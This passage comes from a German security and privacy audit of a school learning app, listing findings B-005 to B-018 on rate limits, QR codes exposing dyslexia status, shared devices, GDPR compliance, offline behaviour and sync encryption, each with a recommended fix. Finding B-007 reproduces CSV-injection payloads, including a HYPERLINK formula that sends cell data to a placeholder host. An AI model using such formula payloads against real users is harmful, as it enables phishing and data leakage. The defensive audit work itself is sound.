- **Betroffene:** alle Schulen; Betreiber (Kosten/Kontingente).
- **Folgen:** Umgehung der Brute-Force-Bremse oder schulweite Sperre durch ein einzelnes Kind.
- **Empfehlung (Vorschlag zur Prüfung):** Den von Supabase garantiert gesetzten, nicht fälschbaren Eintrag verwenden (in der Regel den rechtesten vertrauenswürdigen Eintrag bzw. `cf-connecting-ip`, falls von Supabase gesetzt), nach Prüfung in einem Testprojekt. Limits zusätzlich je Raum (Fehlversuche je Code) und je Teilnehmertoken. Die IP mit täglich rotierendem Salz hashen.
- **Aufwand:** S–M
- **Erfolgskriterium:** Dokumentierter Gateway-Test. DB-Vertragstest mit gefälschtem linken Eintrag bleibt gesperrt.
- **Quelle:** `agent-b-sicherheit.md`

### B-006 – Inhaltsübertragung ohne Rate-Limit: Speicher-DoS des gemeinsamen Supabase-Projekts

- **Bereich:** Verfügbarkeit Supabase
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, PGlite); Produktionsgrenzen (Request-Größe, Tarif) nicht geprüft
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Jeder mit dem öffentlichen Key kann beliebig viele Transfers reservieren und je 10 MiB hochladen. Sie bleiben bis zu 24 h liegen. Räume und Transfers teilen sich ein Projekt. Im Free-Tarif (500 MB DB; Tarif unbekannt) wäre die Datenbank nach rund 50 Uploads voll und ginge in den Nur-Lese-Modus. Dann fallen alle Laufdiktat-Räume aus.
- **Belege:** `supabase/migrations/20260825115651_create_encrypted_content_transfers.sql:111-201` (`reserve_content_transfer` ohne `enforce_rate_limit`), `:203-253` (`upload_content_transfer`, bis 10 MiB je Paket); `repro-b/db-abuse.test.mjs`, Test 3 → `{"reservationsFromOneIp":301,"tenMiBUploadAccepted":true,"transferRateLimitRows":0}`.
- **Betroffene:** alle Schulen (Ausfall der Live-Räume).
- **Folgen:** Ausfall des Unterrichtsangebots, Kosten.
- **Empfehlung (Vorschlag zur Prüfung):** `enforce_rate_limit('reserve_transfer', …)` ergänzen. Paketgröße realistisch begrenzen (Vokabelpakete sind KB groß). Globale Obergrenze aktiver Transfers. Transfers und Räume ggf. in getrennte Projekte legen. Speicher-Alarm einrichten.
- **Aufwand:** S
- **Erfolgskriterium:** DB-Vertragstest: die 21. Reservierung in 10 min von einer Adresse scheitert. Upload über z. B. 512 KiB wird abgewiesen.
- **Quelle:** `agent-b-sicherheit.md`

### B-007 – CSV-Export neutralisiert keine Formeln; Inhalte sind von Fremden steuerbar

- **Bereich:** Web-Sicherheit / Lehrkraftgerät
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert für die erzeugte Datei); Auswertung in Tabellenprogrammen nicht geprüft
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Zellen, die mit `=`, `+`, `-`, `@`, Tab oder CR beginnen, werden nicht entschärft. Quellen der Zellinhalte sind Präsenzschlüssel (B-003, ohne Beitritt fälschbar) und `word_errors`-Schlüssel (B-004, nicht gegen die Raumwörter geprüft). Die Lehrkraft öffnet die Datei in Excel oder Numbers.
- **Belege:** `src/integrations/laufdiktat/teacher-results.ts:14-17` (`escapeCsv` quotet nur `;"\n`), `:92-97` (Fehlerwörter aus `word_errors`), Namen aus `allNames` (`use-live-room-session.ts:361-368, 459-474`); `repro-b/csv-injection.test.ts` → Zeilen `"=HYPERLINK(""https://example.invalid/?x=""&A3;""Hilfe"")";Aktiv;…`, `=1+1;3`, `"@SUM(1;2)";1`.
- **Betroffene:** Lehrkräfte.
- **Folgen:** Phishing-Links in der Ergebnisliste, verfälschte Auswertungen. DDE-Angriffe sind in aktuellen Office-Versionen meist entschärft, aber nicht überall.
- **Empfehlung (Vorschlag zur Prüfung):** OWASP-Empfehlung umsetzen: Zellen mit führendem `= + - @ \t \r` mit `'` voranstellen. Präsenzschlüssel nie exportieren. `word_errors` serverseitig validieren.
- **Aufwand:** S
- **Erfolgskriterium:** Einheitstest mit Formelpräfixen grün.
- **Quelle:** `agent-b-sicherheit.md`

### B-008 – LRS-Freigabe im Einschreibe-QR lesbar und am QR sichtbar

- **Bereich:** Datenschutz (sensible Information über Kinder)
- **Schwere:** P2 (Prüfinstanz: P1)
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** abgeschwächt (F): Auf dem gedruckten Bogen sind alle Codes 180 px groß; sichtbar nur in der Einzelansicht (220/280 px). Konzeptionelles Problem bleibt; Sofortmaßnahme vor dem nächsten Druck.
- **Beschreibung:** Der Einschreibe-QR enthält Klarnamen, Klasse, Lehrkraft, Schuljahr, das 128-Bit-`enrollmentToken` und bei Schreiberleichterung die signierte Freigabe. Wer den Code scannt (Kamera-App, Foto des Bogens, Blick über die Schulter), kann ihn ohne Schlüssel dekodieren: base64url, Bit 4 im ersten Byte. Schon die **Größe** verrät den Status. Der Code mit Freigabe hat 69 statt 61 Modulen und wird in der Einzelansicht bewusst größer gezeigt (280 statt 220 px). Auf einem projizierten oder gedruckten Bogen ist der Unterschied sichtbar. Der Link landet beim Öffnen im Safari-Verlauf des Geräts (Fragment). Die Aussage in Vault 13 und SR-002 („Server, Raum und andere Geräte erfahren weder … noch LRS-Status“) stimmt für Server und Raum. Sie stimmt nicht für Menschen, die den QR sehen.
- **Belege:** `src/domain/class-enrollment.ts:150-221` (`encodeEnrollmentV3`, Flag `4` = Freigabe in Z. 166-174, Klartextfelder Name/Klasse/Lehrkraft), `:477-490` (`createEnrollmentLink`, Code im URL-Fragment); `app/components/teacher-class-configurator.tsx:618-623` (`size={member.writingRelief ? 280 : 220}`), `:380-394` (QR-Bogen mit Namen); `repro-b/lrs-qr.test.tsx` → `{lenMia:316, lenBen:411, modulesMia:61, modulesBen:69, readableWithoutKey:{name:"Ben Muster", class:"Klasse 4a", teacher:"Frau Beispiel", writingRelief:true}}`.
- **Betroffene:** Kinder mit Lese-Rechtschreib-Störung/-Schwäche und deren Eltern; Lehrkräfte als Verarbeitende.
- **Folgen:** Mitschüler oder Dritte erfahren von einer Lernstörung. Das kann stigmatisieren. Je nach Einordnung handelt es sich um Gesundheitsdaten (Art. 9 DSGVO). Laut § 36 BaySchO genügt für den LRS-Nachweis eine schulpsychologische Stellungnahme (Suchtreffer gesetze-bayern.de; Wortlaut nicht online verifiziert).
- **Empfehlung (Vorschlag zur Prüfung):** (1) Kurzfristig: einheitliche QR-Größe. Einheitliche Nutzlast: immer eine signierte Aussage mitsenden, mit `true` oder `false`, gleiche Länge. Kein visueller Unterschied auf dem Bogen. (2) Den QR-Bogen als vertrauliches Dokument kennzeichnen und eine Druck-/Vernichtungsanleitung beigeben. (3) Mittelfristig die Freigabe aus dem dauerhaft ausgedruckten Einschreibe-QR herauslösen: eigener, kurzlebiger Freigabe-QR, den nur das Kind sieht, oder Freigabe nur im Live-Raum, verschlüsselt mit dem `enrollmentToken`. (4) Die Datenschutzfolgen in Verzeichnis/DSFA aufnehmen (siehe B-011).
- **Aufwand:** S (1–2), M (3)
- **Erfolgskriterium:** Codes mit und ohne Freigabe sind gleich lang und gleich groß. Ein Test prüft die Längengleichheit. Die Dokumentation beschreibt die verbleibende Offenlegung ehrlich.
- **Quelle:** `agent-b-sicherheit.md`

### B-009 – Lehrerdaten ohne Zugriffsschutz auf geteilten Geräten; „Lehrer-Login“ täuscht Schutz vor

- **Bereich:** Datenschutz / Rollen (Entscheidung 43)
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** bestätigt (F): gerade für den Pilot, weil `docs/cloud-sync.md` „Laptop zu Hause, Tafel in der Schule“ als Szenario nennt.
- **Beschreibung:** Entscheidung 43 stellt „Gerät/Browserprofil = Schutzgrenze“ auf und verlangt, dass die Navigation „Lehrerbereich“ statt „Lehrer-Login“ heißt. Die Schülerstartseite bietet trotzdem „Lehrer-Login“ an. Das verspricht einen Schutz, den es nicht gibt. Gleichzeitig ist der beworbene Anwendungsfall des Geräte-Abgleichs die **Tafel im Klassenzimmer**, also ein typisch geteiltes Gerät, das Kinder bedienen, wenn sie an die Tafel kommen. Wer dort `/lehrer/klassen` öffnet, sieht Klarnamen, LRS-Haken, Leistungsbriefe und Einschreibe-QRs. Er kann Freigaben ausstellen, wenn Schlüssel synchronisiert sind, und Daten exportieren oder löschen. Die Option „geteiltes Gerät“ verhindert nur das Merken des Passworts, nicht das Ablegen der entschlüsselten Daten in IndexedDB. Dasselbe gilt, wenn die Lehrkraft auf einem Schul-iPad aus dem Klassensatz vorbereitet.
- **Belege:** `app/views/start/landing-screen.tsx:68` (Link „Lehrer-Login“ auf der Schülerstartseite); `app/lehrer/*` ohne jede Sperre; Hinweis nur in `app/lehrer/einstellungen/page.tsx:10-14`, nicht in `app/lehrer/klassen`; `app/components/cloud-sync-setup.tsx:162, 267, 552-554` („Andere nutzen dieses Gerät“ steuert nur das Merken des Schlüssels); `docs/cloud-sync.md` („Unterricht an der digitalen Tafel auf Gerät B“); Startseite → „Lehrer-Login“ → `/lehrer` öffnet sich ohne Abfrage (im Browserlauf gesehen). Codepfade oben.
- **Betroffene:** Kinder (Daten über sie), Lehrkräfte (Verantwortung), Schulleitung.
- **Folgen:** Kinder erfahren Namen, LRS-Status und Ergebnisse anderer Kinder. Datenverlust oder Manipulation durch Löschen und Importieren. Verletzung der Vertraulichkeit nach Art. 32 DSGVO.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Sofort: Beschriftung „Lehrerbereich“. Den Schutzhinweis auf jeder Lehrerseite mit Personendaten zeigen. Personenbezogene Bereiche (Schülerliste, Ergebnisse, Schlüssel) standardmäßig nur auf Geräten anbieten, die die Lehrkraft ausdrücklich als „persönlich“ markiert hat. (2) Kurzfristig: eine lokale App-Sperre (PIN/Passkey über WebAuthn) für den Lehrerbereich. Lehrerdaten auf dem Gerät mit dem Abgleich-Schlüssel verschlüsseln und nur nach Entsperren entschlüsseln (die Krypto-Bausteine existieren). (3) Für Tafeln einen Modus „nur Material“: Abgleich ohne Schülerliste und ohne Ergebnisse, erzwungen, wenn „geteilt“ gewählt ist.
- **Aufwand:** S (1), M (2–3)
- **Erfolgskriterium:** Auf einem als „geteilt“ markierten Gerät liegen keine Schülernamen/LRS-Daten im Klartext in IndexedDB (Test). Der Lehrerbereich mit Personendaten verlangt eine Entsperrung.
- **Quelle:** `agent-b-sicherheit.md`

### B-010 – Schülergeräte: keine Trennung mehrerer Kinder, kein Profilwechsel, kein Löschen

- **Bereich:** Datenschutz / Zuverlässigkeit
- **Schwere:** P1 — P1 bei geteilten iPads (Klassensatz/Koffer), P2 bei 1:1-Ausstattung
- **Evidenzstatus:** bestätigt (Codeanalyse); Tragweite hängt von der Geräteausstattung ab (offene Frage)
- **Gegenprüfung:** bestätigt (F): gestufte Schwere sachgerecht; mit E-001 als ein Befund zu führen. Geräteausstattung der Pilotklasse ist nicht dokumentiert (offene Frage). Empfehlung eingeschränkt (F, Teil 6.3): Profile je Kind lösen nur feste Geräte; bei Koffer-iPads zuerst Ausstattungsfrage klären (Roadmap S14, M3).
- **Beschreibung:** Das Modell lautet „ein Browserprofil = ein Kind“. Auf iPads aus dem Klassensatz übernimmt das nächste Kind den Lernraum des vorigen: Fehlerliste, Wortspeicher, Tier, Klassenmitgliedschaft mit Klarnamen und LRS-Freigabe (die dann für das falsche Kind wirkt), Aufgaben. Ein Kind kann seine Daten nicht selbst löschen. Es bleibt nur „Websitedaten löschen“ in den iPad-Einstellungen, was oft per MDM gesperrt ist. Der Plan benennt das Problem selbst, umgesetzt ist es nicht.
- **Belege:** eine Datenbank je Origin (`src/storage/personal-learning-events.ts:71-156`, `student-classes.ts:12-20`), Profil in `localStorage` (`src/storage/learner-profile.ts`), keine Funktion „Profil wechseln“, „abmelden“ oder „alle Daten löschen“ (Suche ohne Treffer); `app/components/student-class-enrollment.tsx:213` zeigt `displayName`; offen benannt in `docs/umsetzungsplan-lernraum-ui.md:61`; Codesuche; Ablauf: Kind A schreibt sich ein → Kind B öffnet auf demselben Gerät „Klasse“ → sieht „… · Mia Muster“.
- **Betroffene:** Grundschulen mit geteilten Geräten (in Bayern verbreitet; Annahme, nicht verifiziert), Kinder mit LRS-Freigabe.
- **Folgen:** Gegenseitige Einsicht in Fehler und Lernstände, falsche Zuordnung von Lernständen, LRS-Toleranz für das falsche Kind, keine praktikable Umsetzung des Löschrechts.
- **Empfehlung (Vorschlag zur Prüfung):** Mehrere lokale Profile je Gerät (eigene Dexie-Datenbank je Profil, Wahl über Tier und Bild ohne Klarnamen, optional mit Bild-PIN). „Gerät freigeben“: Profil abmelden und dabei optional Sicherung anstoßen. „Meine Daten löschen“. Klare Aussage in `device-support.md`, ob geteilte Geräte unterstützt werden.
- **Aufwand:** L
- **Erfolgskriterium:** E2E-Test: zwei Profile auf einem Gerät sehen sich gegenseitig nicht. Löschen entfernt alle Tabellen eines Profils.
- **Quelle:** `agent-b-sicherheit.md`

### B-011 – Rechtsrahmen: Echtbetrieb mit Kindern ohne AVV, Verzeichnis, DSFA, Freigabe; Datenschutzerklärung unvollständig und teils falsch

- **Bereich:** Datenschutz-Compliance (bayerischer Schulkontext)
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (Dokumenten- und Codeanalyse); rechtliche Bewertung offene Frage
- **Gegenprüfung:** bestätigt (F): Widerspruch Impressum ↔ Einsatz belegt; kein P0, weil der Server nur pseudonyme Daten erhält. Engpass ist organisatorisch (Vertragspartner Schule/Sachaufwandsträger).
- **Beschreibung:** Impressum und Pilotpraxis widersprechen sich. Laut Code-Kommentaren und Doku läuft die App bereits im Unterricht mit Klassen. Gleichzeitig untersagt das Impressum den Einsatz mit echten Schülerdaten und stellt fest, dass weder AVV noch abschließende Datenschutzerklärung vorliegen. „Nicht öffentlich zugänglich“ ist technisch nicht belegt: Die App hat keine Zugangsschranke, ein vorgeschalteter Cloudflare-Access-Schutz war nicht prüfbar. Die Datenschutzerklärung: - nennt **keine Rechtsgrundlagen** und keine Speicherfristen (Räume ≤ 24 h nach Ende, Transfers ≤ 24 h, Rate-Limit-Einträge 1 Tag mit **ungesalzenem SHA-256 der IP**, also für IPv4 umkehrbar), - erwähnt **die Inhaltsübertragung über Supabase nicht**, ebenso wenig die **Sprachausgabe über Cloud-Stimmen** (B-012), die **Weitergabe von Fortschritt und Fehlerwörtern an alle Raumgeräte** (B-003), die **Einschreibe-QRs mit Namen und … (vollständig in `agent-b-sicherheit.md`)
- **Belege:** `app/impressum/page.tsx` („geschlossener Rahmen … nicht öffentlich zugänglich … weder AVV noch abschließende Datenschutzerklärung … keine echten personenbezogenen Daten von Schülerinnen und Schülern … nicht im regulären Schulbetrieb“); `app/datenschutz/page.tsx` (Abschnitt 4 „Anmeldung mit ChatGPT“; Verantwortlicher = Privatperson); `app/components/live-room-join.tsx:237-243` (Kommentar „… from real classroom use“); Vault 12 („in Produktion … geprüft“), `docs/laufdiktat-pilot-operations.md` … (vollständig in `agent-b-sicherheit.md`); Lesen der genannten Seiten und Dokumente.
- **Betroffene:** Schulleitung (Verantwortliche), Lehrkräfte, Kinder und Eltern (Transparenz).
- **Folgen:** Rechtswidrige Verarbeitung, Beanstandung durch die Aufsicht (BayLfD für öffentliche Schulen), persönliche Haftungs- und Dienstpflichtfragen für die Lehrkraft, Vertrauensverlust bei Eltern.
- **Empfehlung (Vorschlag zur Prüfung):** Siehe Abschnitt 5. Kurzfristig: Echtbetrieb an die Freigabe durch die Schulleitung nach Beteiligung der behördlichen Datenschutzbeauftragten koppeln. Verzeichnis der Verarbeitungstätigkeiten erstellen, DSFA-Schwellwertprüfung durchführen (Kinder, mögliche Art.-9-Daten, neue Technik → DSFA wahrscheinlich). AVV mit Supabase (DPA mit SCC laut Drittquelle) und Cloudflare abschließen, Vertragspartner muss die Schule bzw. der Sachaufwandsträger sein, nicht die Privatperson. Datenschutzerklärung je Verarbeitung neu schreiben (Zweck, Rechtsgrundlage, Empfänger, Drittland, Frist). ChatGPT-Abschnitt und `app/chatgpt-auth.ts` entfernen. IP-Hashes salzen und rotieren oder durch `CF-Connecting-IP`-basierte Kurzzeitschlüssel ersetzen.
- **Aufwand:** M (Dokumente), organisatorisch L
- **Erfolgskriterium:** Schriftliche Freigabe der Schule. Verzeichnis und DSFA (oder dokumentierte Schwellwertprüfung) liegen vor. Jede Datenverarbeitung aus Abschnitt 5.1 erscheint in der Datenschutzerklärung. Das Impressum widerspricht dem Betrieb nicht mehr.
- **Quelle:** `agent-b-sicherheit.md`

### B-012 – Sprachausgabe bevorzugt Cloud-Stimmen; Texte gehen an Google/Microsoft

- **Bereich:** Datenschutz (Drittübermittlung)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert auf Funktionsebene mit nachgebildeten Stimmenlisten); Übermittlung an Anbieter laut Browserdoku, nicht mitgeschnitten
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Bewertung belohnt genau die Namensbestandteile von Netzwerkstimmen. In Edge („Microsoft … Online (Natural)“) und Chrome Desktop („Google Deutsch“, `localService=false`) wird damit eine Stimme gewählt, die den Text an Server des Herstellers schickt. Betroffen sind Laufdiktat-Wörter, Textbox-Texte und Vokabeln, darunter von Kindern selbst angelegte Karten. Auf iPadOS sind die Stimmen in der Regel lokal; betroffen sind Windows-Rechner, Chromebooks und Tafel-PCs.
- **Belege:** `src/speech/voices.ts:39-55` (`QUALITY_BONUS`: `natural` +30, `neural` +30, `online` +20, `google` +20), `:63-84` (`rankVoice` ignoriert `localService`); `repro-b/voices.test.ts` → `Edge -> Microsoft Katja Online (Natural) … localService=false`, `Chrome -> Google Deutsch localService=false`.
- **Betroffene:** Kinder und Lehrkräfte an Windows-/ChromeOS-Geräten.
- **Folgen:** Nicht dokumentierte Übermittlung an US-Anbieter. Bei kindereigenen Inhalten kann das personenbezogen sein, etwa wenn ein Kind seinen Namen als Vokabel anlegt.
- **Empfehlung (Vorschlag zur Prüfung):** `localService === true` stark bevorzugen. Netzwerkstimmen nur nach ausdrücklicher Wahl in den Einstellungen und mit Hinweis zulassen. In die Datenschutzerklärung aufnehmen.
- **Aufwand:** S
- **Erfolgskriterium:** Test: Bei vorhandener lokaler Stimme wird nie eine `localService=false`-Stimme gewählt.
- **Quelle:** `agent-b-sicherheit.md`

### B-013 – Offline-Fähigkeit schmaler als behauptet; nach jedem Update fast nichts mehr offline; keine echten Offline-Tests

- **Bereich:** Zuverlässigkeit / PWA
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse) und teilweise reproduziert (Dev-Server)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Vault 16 verspricht „nach dem ersten Laden weitgehend offline nutzbar“. Tatsächlich gilt: (1) Offline geht nur, was auf diesem Gerät unter der **aktuellen** SW-Version schon einmal geöffnet wurde. (2) Ein Update (häufige Deployments) löscht den alten Cache. Danach ist nur noch das HTML der Startseite vorgeladen, ohne seine Skripte. Ein Kind, das die installierte App zu Hause offline öffnet, nachdem in der Schule ein Update installiert wurde, bekommt eine nicht funktionsfähige Seite. (3) Unbesuchte Routen liefern offline das HTML der Startseite unter fremder URL. (4) Bei schlechtem Schul-WLAN („Lie-Fi“) wartet `networkFirst` ohne Zeitlimit; im Test lud die Navigation in 45 s nicht. (5) Clientseitige Navigation per RSC-Abruf läuft am SW vorbei. Gut gelöst ist der Verbindungsabbruch **während** einer Runde: Die geladene Seite arbeitet lokal weiter (vorhandener E2E-Test), der Fortschritt … (vollständig in `agent-b-sicherheit.md`)
- **Belege:** `scripts/service-worker.template.js:4-11` (Vorabcache nur `/` und Icons), `:25-39` (`activate` löscht **alle** älteren Caches), `:63-66, 75-96` (`networkFirst` ohne Zeitlimit, Rückfall auf HTML von `/`), `:68-72` (nur `style/script/font/image/worker` gecacht; RSC-Abrufe `?_rsc=` werden nicht abgefangen); `playwright.config.ts:24` (`serviceWorkers: "block"`); `e2e/installability.spec.ts` (nur Registrierung); `tests/rendered-html.test.mjs:232-256` (Regex auf Quelltext); … (vollständig in `agent-b-sicherheit.md`); `repro-b/browser/offline-proxy3.mjs` (Log `offline-proxy3.log`): besuchte Route offline mit Inhalt; `/lernen` und `/frei/mathematics` offline mit rohem `<h1>` „Dein Lernraum“ (Startseiten-HTML) und danach Fehlerseite. `offline-proxy.mjs`: Lie-Fi-Navigation `Timeout 45000ms`. Einschränkung: `vinext dev`; das Verhalten gehashter Produktionschunks ist nicht beobachtet.
- **Betroffene:** Kinder beim Üben zu Hause ohne oder mit schlechtem Netz; Klassen mit instabilem WLAN.
- **Folgen:** „App geht nicht“ ohne erkennbaren Grund, Abbruch der täglichen Übung, Vertrauensverlust.
- **Empfehlung (Vorschlag zur Prüfung):** Build-Manifest der Lernrouten und ihrer Chunks vorab cachen (Startseite, `/lernen`, Kernmodule). Navigationen „stale-while-revalidate“ oder network-first mit 3–4 s Zeitlimit. RSC-Abrufe cachen oder offline auf harte Navigation umleiten. Alte Caches erst löschen, wenn der neue Vorabcache vollständig ist. Eine Offline-Seite mit Erklärung zeigen. Eine eigene Playwright-Suite mit `serviceWorkers: "allow"` gegen den **Produktionsbuild** einrichten: Kaltstart offline, Lie-Fi, Update-Wechsel.
- **Aufwand:** M
- **Erfolgskriterium:** E2E gegen Produktionsbuild: nach SW-Update und Netzabschaltung starten `/lernen`, LernBox, Wortspeicher und Kopfrechnen. Lie-Fi-Navigation fällt nach höchstens 5 s auf den Cache zurück.
- **Quelle:** `agent-b-sicherheit.md`

### B-014 – Geräte-Abgleich akzeptiert unverschlüsselte Datei trotz Passwort (Downgrade)

- **Bereich:** Datenintegrität Cloud-Abgleich
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Ein Gerät mit gesetztem Passwort liest eine Cloud-Datei ohne Verschlüsselung ohne Rückfrage, führt sie zusammen und lädt sie dann wieder verschlüsselt hoch. Damit „adelt“ es fremde Änderungen. Wer Schreibzugriff auf den Ordner hat, das Passwort aber nicht kennt (geteilter Nextcloud-Ordner, kompromittiertes Konto, fremde App mit Ordnerzugriff), kann Material, Aufgaben, Klassen, Schülerlisten und Ergebnisse einschleusen. AES-GCM würde die Integrität gerade schützen, wird hier aber umgangen.
- **Belege:** `src/integrations/cloud-sync/envelope.ts:221-238` (`openEnvelope`: `encryption === null` → Nutzlast ungeprüft übernommen), `src/integrations/cloud-sync/engine.ts:149-158` (`readRemote`), `:315-321` (`encryptionChanged` erkennt den Wechsel auf „unverschlüsselt“ nicht); `repro-b/sync-downgrade.test.ts` → `{"status":"idle","names":["MANIPULIERT"],"encryptedAfter":true,"uploaded":true}`.
- **Betroffene:** Lehrkräfte mit verschlüsseltem Abgleich.
- **Folgen:** Manipulierte Aufgaben/Materialien gelangen über die Lehrkraft an Kinder; verfälschte Leistungsbriefe.
- **Empfehlung (Vorschlag zur Prüfung):** Ist lokal `encrypted = true`, eine unverschlüsselte Remote-Datei als `locked`/Konflikt behandeln und eine ausdrückliche Bestätigung verlangen. Kopf und Nutzlast authentisch binden (Kopf als AES-GCM-AAD).
- **Aufwand:** S
- **Erfolgskriterium:** Der Repro-Test endet mit Status `locked` und unveränderten lokalen Daten.
- **Quelle:** `agent-b-sicherheit.md`

### B-015 – Keine Sicherheitsheader/CSP; Drittanbieter-Skript mit vollem Zugriff auf Kinderdaten und Schlüssel

- **Bereich:** Web-Sicherheit (Defense in Depth)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse und Dev-Server); Produktions-Header nicht prüfbar
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Es gibt keine CSP, kein `frame-ancestors`/X-Frame-Options (Clickjacking des Lehrerbereichs möglich), kein HSTS im Repository, keine Referrer-Policy (der Raumcode steht in `/raum?code=`) und keine Permissions-Policy (Kamera). In derselben Origin liegen Lernstände, Lehrerdaten mit Klarnamen und LRS, **exportierbare** private Klassenschlüssel (`classSealSchema.privateJwk`), OAuth-Refresh-Token und ggf. das WebDAV-Passwort im Klartext (B-016). Eine einzige XSS-Lücke oder ein kompromittiertes Drittanbieter-Skript reicht für den Abfluss. XSS selbst habe ich nicht gefunden: React escapt, KaTeX läuft mit `trust:false` und `maxExpand`, es gibt kein `innerHTML` mit Fremddaten. Fonts sind selbst gehostet, es gibt keine Tracker.
- **Belege:** `next.config.ts` (leer), `worker/index.ts:28-46` (keine Header), `dist/client/_headers` (nur Cache-Control), `app/layout.tsx:112-113` (Inline-Skripte), `src/integrations/cloud-sync/google-identity.ts:39-57` (lädt `https://accounts.google.com/gsi/client` in die eigene Origin); `curl -D - http://127.0.0.1:3002/` → nur `vary`, `cache-control`, `content-type`.
- **Betroffene:** alle.
- **Folgen:** Totalabfluss bei einer künftigen Injektionslücke; Clickjacking.
- **Empfehlung (Vorschlag zur Prüfung):** Header im Worker setzen: CSP mit Nonce für die zwei Inline-Skripte, `connect-src` auf Supabase-, Microsoft-, Google- und WebDAV-Ziele begrenzt (WebDAV ist frei konfigurierbar, deshalb ggf. nur für die Lehrerseiten erweitern), `frame-ancestors 'none'`, HSTS, `Referrer-Policy: no-referrer`, `Permissions-Policy: camera=(self)`. Den Google-Login in ein Popup auf eigener Unterseite auslagern oder auf den Redirect-Fluss mit PKCE umstellen, damit kein Fremdskript in der Haupt-Origin läuft. Klassenschlüssel als nicht exportierbaren `CryptoKey` halten; Export nur für die Sicherung, mit Passwort.
- **Aufwand:** M
- **Erfolgskriterium:** Header-Test in `rendered-html.test.mjs` bzw. gegen den Worker. Mozilla Observatory mindestens B+.
- **Quelle:** `agent-b-sicherheit.md`

### B-016 – Zugangsdaten im Browser: Refresh-Token und ggf. WebDAV-Passwort im Klartext

- **Bereich:** Sicherheit Cloud-Abgleich
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Der OAuth-Fluss selbst ist sauber: PKCE S256, `state`-Prüfung, kein Client-Secret, `returnTo` nur aus App-Konstanten, also kein Open Redirect, enge Scopes (`Files.ReadWrite.AppFolder`, `drive.appdata`). Token liegen aber im Klartext in `localStorage`, auf geteilten Geräten dauerhaft. Das WebDAV-App-Passwort liegt im Klartext, wenn keine Verschlüsselung gemerkt ist. Das ist im Register (SR-003) teilweise benannt. `login.microsoftonline.com/common` erlaubt private Microsoft-Konten, die Lehrkraft kann also Schuldaten in ihr privates OneDrive legen (siehe Abschnitt 5).
- **Belege:** `src/integrations/cloud-sync/session.ts:18-20, 61-72` (`lernraum:cloud-sync:tokens` in `localStorage`), `src/integrations/cloud-sync/credentials.ts:66-80` (`{ plain: password }` ohne Schlüssel); Codepfade.
- **Betroffene:** Lehrkräfte.
- **Folgen:** Kontozugriff bei XSS oder an geteilten Geräten.
- **Empfehlung (Vorschlag zur Prüfung):** Token in der Credential-DB ablegen, mit dem nicht exportierbaren Schlüssel verschlüsseln. Bei „geteiltes Gerät“ nichts dauerhaft speichern. Optional nur organisatorische Konten zulassen (`organizations` statt `common`), wenn die Schule es verlangt.
- **Aufwand:** S
- **Erfolgskriterium:** Keine Token im Klartext im Speicher (Test).
- **Quelle:** `agent-b-sicherheit.md`

### B-017 – Inhaltsübertragung: Geheimnisse entstehen auf dem Server; manuelle Codes sperrbar

- **Bereich:** Kryptografie-Design
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Kryptografie selbst ist solide: AES-256-GCM, zufälliger Inhaltsschlüssel, zwei getrennte Umschläge, PBKDF2 mit 210 000 Durchläufen, ein Alphabet mit 32 Zeichen ohne Modulo-Verzerrung, Locator mit 40 bit plus Geheimnis mit 80 bit, nur Hashes gespeichert, Brute-Force auch über viele Räume praktisch aussichtslos. Die Geheimnisse **erzeugt** aber der Server. Damit ist die Verschlüsselung keine Ende-zu-Ende-Verschlüsselung gegenüber Supabase, wie es Vault 12 nahelegt („Supabase erhält nur Chiffrat …“). Sie schützt Ruhedaten und Backups, nicht vor dem Betreiber oder einem Mitschnitt der RPC-Antwort. Wer den 24-stelligen Code sieht (am Beamer), kann mit 5 falschen Versuchen den manuellen Abruf für 15 min sperren; der QR-Weg bleibt offen. Die Inhalte sind Lehrkraftmaterial, meist ohne Personenbezug, daher geringe Tragweite.
- **Belege:** `supabase/migrations/20260825115651_create_encrypted_content_transfers.sql:150-199` (`reserve_content_transfer` erzeugt `retrieval_token` und `manual_secret` und gibt sie im Klartext zurück), `:344-376` (Sperre je Locator nach 5 Fehlversuchen); `src/integrations/content-transfer/crypto.ts:40-70` (Schlüsselumschlag aus genau diesen Geheimnissen); Codepfade; vorhandener DB-Test „locks manual retrieval …“.
- **Betroffene:** Lehrkräfte, Kinder (Verfügbarkeit des Abrufs).
- **Folgen:** Falsches Sicherheitsversprechen in der Doku; kurzzeitige Abrufsperre.
- **Empfehlung (Vorschlag zur Prüfung):** Geheimnisse im Client erzeugen und nur Hashes an `reserve_content_transfer` übergeben. Doku präzisieren. Sperre je Locator mit Abklingzeit pro Absender kombinieren.
- **Aufwand:** S–M
- **Erfolgskriterium:** Der Server sieht nie ein Klartextgeheimnis (Vertragstest prüft Signatur der RPC).
- **Quelle:** `agent-b-sicherheit.md`

### B-018 – Leistungsbriefe, Aufgaben- und Entfernungscodes sind fälschbar

- **Bereich:** Integrität Klassenkommunikation
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
